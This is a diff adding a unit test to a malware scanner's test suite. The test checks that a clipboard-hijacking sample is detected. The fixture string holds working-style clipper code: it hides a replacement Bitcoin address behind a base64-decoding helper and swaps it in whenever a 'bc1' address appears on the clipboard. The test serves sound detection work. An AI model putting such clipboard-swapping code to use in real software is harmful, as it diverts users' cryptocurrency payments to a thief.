@@ -138,3 +138,20 @@ class TestTheRule:
                 tgz.addfile(info, io.BytesIO(data))
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
         assert "MALWARE.CLIPPER.001" in {f.rule_id for f in result.findings}
+
+
+class TestTheReplacementIsBuiltByTheFilesOwnHelper:
+    def test_a_decoded_constant_through_a_helper_and_a_constructor_default(self) -> None:
+        source = (
+            "import base64, re, pyperclip\n"
+            "def _d(blob):\n"
+            "    return base64.b64decode(blob).decode()\n"
+            "class Workspace:\n"
+            "    def __init__(self, replacements=None):\n"
+            "        self.replacements = replacements or {'btc': _d('YmMxcXg=')}\n"
+            "    def watch(self):\n"
+            "        text = pyperclip.paste()\n"
+            "        if re.match('^bc1', text):\n"
+            "            pyperclip.copy(self.replacements['btc'])\n"
+        )
+        assert Kit.replaced(source) == ["clipboard replaced"]
